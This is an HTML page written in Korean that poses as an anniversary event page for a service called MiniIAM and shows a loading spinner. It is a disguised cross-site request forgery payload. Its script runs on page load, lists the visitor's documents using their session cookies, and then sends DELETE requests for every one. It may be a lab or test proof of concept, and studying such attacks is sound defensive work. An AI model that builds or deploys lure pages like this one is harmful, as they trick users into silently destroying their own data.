<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>MiniIAM Docs Event 참여 중...</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #f8f9fa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
  </style>
</head>
<body>

<div class="text-center">
  <h3 class="mb-3">🎉 MiniIAM 1주년 기념 이벤트에 참여 중입니다!</h3>
  <div class="spinner-border text-primary" role="status">
    <span class="visually-hidden">로딩 중...</span>
  </div>
  <p class="mt-3 text-muted">참여 정보 확인 중... 잠시만 기다려주세요.</p>
</div>

<script>
  // 1. GET /documents → ID 목록 획득
  fetch("/documents", {
    method: "GET",
    credentials: "include" // 세션 쿠키 자동 포함
  })
  .then(res => res.json())
  .then(docs => {
    docs.forEach(doc => {
      // 2. DELETE 요청 반복
      fetch(`/documents/${doc.id}`, {
        method: "DELETE",
        credentials: "include"
      });
    });
  });
</script>

</body>
</html>
